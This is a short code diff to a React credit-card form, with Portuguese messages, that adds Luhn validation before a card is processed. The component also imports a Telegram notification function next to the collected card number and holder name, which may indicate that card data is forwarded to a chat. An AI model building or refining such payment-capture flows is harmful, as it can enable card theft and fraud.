@@ -11,6 +11,7 @@ import { CardFormFields } from './CardFormFields';
 import { detectCardBrand } from './CardBrandDetector';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
 import { useToast } from '@/hooks/use-toast';
+import { validateCreditCard } from '@/utils/cardLuhnValidator';
 
 interface CardFormProps {
   onSubmit: (data: CreditCardData) => void;
@@ -41,6 +42,18 @@ export const CardForm: React.FC<CardFormProps> = ({
   });
 
   const handleSubmit = async (values: z.infer<typeof cardSchema>) => {
+    // Validar o cartão usando o algoritmo de Luhn antes de processar
+    const { isValid, message } = validateCreditCard(values.number);
+    
+    if (!isValid) {
+      toast({
+        title: "Cartão inválido",
+        description: message || "Verifique os dados do cartão e tente novamente.",
+        variant: "destructive",
+      });
+      return;
+    }
+    
     const cardBrand = detectCardBrand(values.number);
     const cardData: CreditCardData = {
       holderName: values.holderName,
